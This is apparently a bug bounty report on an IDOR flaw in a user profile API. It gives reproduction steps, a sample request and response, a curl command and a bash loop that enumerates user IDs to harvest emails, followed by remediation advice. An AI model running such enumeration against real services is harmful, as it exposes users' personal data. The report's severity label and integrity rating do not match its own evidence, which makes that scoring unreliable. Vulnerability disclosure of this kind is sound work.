# Bug Bounty Report — IDOR in User Profile API

## Summary
An Insecure Direct Object Reference (IDOR) vulnerability exists in the user profile API endpoint at `https://target.com/api/v1/users/{id}`. By modifying the `id` parameter in the API request, an authenticated user can access any other user's profile data including email, phone number, address, and payment information. No authorization check is performed to verify the requesting user owns the profile being accessed.

## Severity: Critical (CVSS 3.1)
**CVSS Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` — Score: 8.1

## Affected Endpoint
- **URL:** `https://target.com/api/v1/users/{id}`
- **Method:** GET
- **Parameter:** `id` (user ID in URL path)
- **Authentication:** Required (any valid user account)

## Steps to Reproduce
1. Create two test accounts: Account A (ID: 1001) and Account B (ID: 1002)
2. Log in as Account A
3. Request your own profile: `GET /api/v1/users/1001`
4. Modify the ID to target Account B: `GET /api/v1/users/1002`
5. Observe that Account B's full profile data is returned, including:
   - Full name
   - Email address
   - Phone number
   - Physical address
   - Last 4 digits of payment method
   - Account creation date

## Proof of Concept

### Request (Account A accessing Account B's profile)
```http
GET /api/v1/users/1002 HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json
```

### Response
```json
{
  "id": 1002,
  "name": "John Doe",
  "email": "john.doe@example.com",
  "phone": "+1-555-0123",
  "address": "123 Main St, City, State 12345",
  "payment": {
    "last4": "4242",
    "brand": "Visa"
  },
  "created_at": "2024-01-15T10:30:00Z"
}
```

### Curl Command
```bash
curl -k -H "Authorization: Bearer YOUR_TOKEN" "https://target.com/api/v1/users/1002"
```

### Enumeration Script
```bash
for id in $(seq 1000 1100); do
  curl -s -k -H "Authorization: Bearer YOUR_TOKEN" "https://target.com/api/v1/users/$id" | jq -r '.email // empty'
done
```

## Impact
An attacker can:
- **Enumerate all user accounts** by iterating through sequential IDs
- **Harvest personal data** (PII) of all users including email, phone, and address
- **Access payment information** (last 4 digits, payment method)
- **Escalate privileges** by combining with other vulnerabilities
- **Violate privacy regulations** (GDPR, CCPA) by accessing user PII

**Business Impact:** Full user data breach affecting all platform users, potential regulatory fines, and loss of customer trust.

## Remediation
1. **Implement proper authorization checks** — verify the authenticated user owns the requested resource before returning data
2. **Use UUIDs instead of sequential IDs** to prevent enumeration
3. **Implement rate limiting** on API endpoints to detect mass enumeration
4. **Add access control middleware** that validates resource ownership on every request
5. **Log and monitor** for unusual access patterns (many different user IDs from single account)

## References
- OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Referrer
- CWE-639: Authorization Bypass Through User-Controlled Key
- PortSwigger IDOR: https://portswigger.net/web-security/idor

## CVSS Calculation Justification
- **AV:N** — Attack Vector is Network (remote exploitation)
- **AC:L** — Attack Complexity is Low (no special conditions)
- **PR:L** — Privileges Required: Low (authenticated user account needed)
- **UI:N** — User Interaction: None (no victim interaction required)
- **S:U** — Scope: Unchanged (only impacts the vulnerable application)
- **C:H** — Confidentiality: High (full access to all user PII)
- **I:H** — Integrity: High (attacker can access/modify sensitive data)
- **A:N** — Availability: None (no availability impact)
